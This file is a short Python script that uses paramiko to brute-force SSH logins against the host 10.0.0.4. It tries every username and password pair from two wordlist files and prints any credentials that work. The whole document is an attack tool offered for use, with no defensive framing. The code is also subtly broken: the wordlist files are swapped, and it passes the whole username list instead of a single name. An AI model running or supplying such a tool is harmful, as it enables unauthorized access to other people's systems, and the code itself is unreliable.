#!/usr/bin/env python

#_*_ coding: utf8 _*_

import paramiko

import time

def brute(host,port,user,password):
	log = paramiko.util.log_to_file('log.log')
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(host,port=port,username=user,password=password)
		print('Credentials {}:{}'.format(user,password))
	except:
		print('Something went wrong!')

def main():
	ip = "10.0.0.4"
	port = 22
	user = open('pass.txt','r')
	user = user.read().split('\n')
	passwords = open('user.txt','r')
	passwords = passwords.read().split('\n')

	for users in user:
		for p in passwords:
			time.sleep(3)
			brute(ip,port,user,p)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
